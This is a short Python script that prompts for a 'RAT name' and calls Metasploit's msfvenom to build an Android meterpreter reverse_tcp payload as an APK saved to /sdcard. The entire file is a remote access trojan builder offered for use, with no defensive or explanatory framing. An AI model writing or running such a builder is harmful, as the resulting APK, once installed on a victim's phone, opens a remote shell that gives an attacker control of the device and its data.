import os





name_of_RAT = input("please enter RAT name: ")
os.system(f"cd && cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4040 R> /sdcard/{name_of_RAT}.apk")